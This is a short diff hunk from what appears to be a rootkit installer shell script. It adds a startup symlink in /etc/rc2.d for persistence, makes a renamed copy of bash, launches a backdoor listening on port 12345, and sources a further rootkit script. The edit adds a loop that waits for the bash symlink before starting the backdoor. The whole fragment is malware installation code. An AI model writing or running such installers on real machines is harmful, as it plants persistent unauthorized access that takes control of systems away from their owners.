@@ -25,8 +25,13 @@ ln -s /etc/init.d/my_rootkit_init.sh /etc/rc2.d/S75my_rootkit
 ln -s /bin/bash /bin/my_rootkit_sh
 
 # start backdoor which port is 12345
-/backdoor 12345
+while [ ! -f "/bin/my_rootkit_sh" ]; do
+	:  # null command
+done
+cd /
+./backdoor 12345
 
 # remove the source files
+cd ${CUR_DIR}
 chmod 755 exec_my_rootkit.sh
 source exec_my_rootkit.sh ${CUR_DIR}
